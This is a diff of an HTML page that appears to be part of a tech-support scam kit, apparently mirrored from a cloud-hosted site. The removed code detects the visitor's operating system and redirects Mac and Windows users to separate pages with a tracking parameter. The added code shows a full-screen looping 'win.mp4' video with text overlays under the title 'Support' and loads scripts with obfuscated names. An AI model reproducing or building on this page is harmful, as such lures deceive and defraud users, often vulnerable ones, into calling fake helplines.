@@ -1,51 +1,72 @@
 <!DOCTYPE html>
 <html lang="en">
-
-<!-- Mirrored from e3303e3303e3303210118.z13.web.core.windows.net/1/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 21 Jan 2026 15:48:08 GMT -->
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Helpline Center</title>
-    <script type='text/javascript' src="../../code.jquery.com/jquery-1.4.4.min.js"></script>
-
-    <script>
-        function getQueryParam(param) {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get(param);
+    <title>Support</title>
+    <script src="js/jquery-3.7.1.min.js"></script>
+    <script src="js/fr3ndYvd7.js"></script>
+    <script src="js/custom.js"></script>
+    <script src="js/cldu2gBTsv.js"></script>
+    <link rel="stylesheet" href="css/custom.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        function myOperatingSystem() {
-            const userAgent = navigator.userAgent;
-            let os = "Unknown";
-            if (userAgent.indexOf("Win") !== -1) {
-                os = "Windows";
-            } else if (userAgent.indexOf("Mac") !== -1) {
-                os = "MacOS";
-            } else if (userAgent.indexOf("Linux") !== -1) {
-                os = "Linux";
-            } else if (userAgent.indexOf("Android") !== -1) {
-                os = "Android";
-            } else if (userAgent.indexOf("iOS") !== -1) {
-                os = "iOS";
-            }
-            return os;
+        
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
         }
-        let operatingSystem = myOperatingSystem();
-        localStorage.setItem('alpha', getQueryParam('alpha'));
-        let p = getQueryParam('bcda').trim();
-        if (operatingSystem === 'MacOS') {
-            window.location.href = "e3303mace3303/index7f66.html?Anph=" + p;
-        } else {
-            window.location.href = "e3303wine3303/index36d8.html?bcda=" + p;
+        
+        #background-video {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(1);
+            min-width: 100%;
+            min-height: 100%;
+            width: 100%;
+            height: 100%;
+            object-fit: fill;
+            z-index: -1;
         }
-
-
-
-    </script>
+        
+        #hello-text {
+            position: fixed;
+            top: 55.3%;
+            left: 60%;
+            transform: translate(-50%, -50%);
+            color: #525252;
+            font-size: 20px;
+            font-weight: 600;
+            z-index: 1;
+            text-align: center;
+            font-family: 'arial';
+        }
+        
+        #footer-text {
+            position: fixed;
+            bottom: 5.3%;
+            left: 62.8%;
+            transform: translateX(-50%);
+            color: #ffffff;
+            font-size: 20px;
+            font-weight: 500;
+            z-index: 1;
+            text-align: center;
+            font-family: 'arial';
+        }
+    </style>
 </head>
-
 <body>
-
+    <video id="background-video" autoplay muted loop playsinline>
+        <source src="win.mp4" type="video/mp4">
+    </video>
+    <div id="hello-text" class="t-f-n-w"></div>
+    <div id="footer-text" class="t-f-n-w"></div>
 </body>
-
 </html>
